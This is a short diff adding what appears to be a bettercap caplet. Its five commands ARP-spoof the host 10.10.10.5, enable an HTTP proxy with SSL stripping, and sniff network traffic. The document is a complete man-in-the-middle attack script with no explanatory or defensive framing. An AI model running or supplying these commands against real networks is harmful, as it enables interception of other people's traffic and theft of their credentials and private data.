@@ -1,0 +1,5 @@
+set arp.spoof.targets 10.10.10.5
+arp.spoof on
+set http.proxy.sslstrip true
+http.proxy on
+net.sniff on
